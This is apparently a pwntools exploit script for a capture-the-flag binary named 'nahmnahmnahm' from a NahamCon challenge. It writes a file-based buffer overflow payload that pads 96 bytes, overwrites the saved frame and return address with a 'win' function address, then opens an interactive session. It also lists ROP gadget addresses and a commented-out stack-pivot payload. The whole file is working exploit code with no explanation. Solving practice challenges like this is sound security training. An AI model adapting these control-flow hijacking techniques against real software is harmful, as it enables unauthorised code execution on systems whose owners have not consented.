from pwn import *
import os
context.log_level = 'debug'
context.arch = 'amd64'

e = context.binary = ELF('./nahmnahmnahm')

r= e.process()

# r = remote('challenge.nahamcon.com', 32743)

lib = e.libc #   matches my libc

#   lib= ELF('libc6_2.36-0ubuntu4_amd64.so')
filename= "file"

pop_rdi=0x00000000004015d3
pop_rsi_r15=0x00000000004015d1
fopen=0x4012B9
fopen=0x40131C
vuln=0x401300
enter=0x40154E
re=0x402029
main=0x401376
ret=0x000000000040101a
win=0x401296

pop_rsp_13_14_15_ret=0x00000000004015cd
def wf(payload):
    f = open(filename,"wb")
    f.write(payload)
    f.close()

payload=b"a"
wf(payload)
r.sendline("file")

payload = b"~///flag".ljust(96)+ flat(0x404500+0x60, win)
# payload=b"flag".ljust(96,b"\x00")+ p64(0x404500) +flat(pop_rsp_13_14_15_ret, 0x404500,13,14,15,0x401308)
wf(payload)
pause()
r.sendafter(b"continue:\n", b"\x0a")

r.interactive()
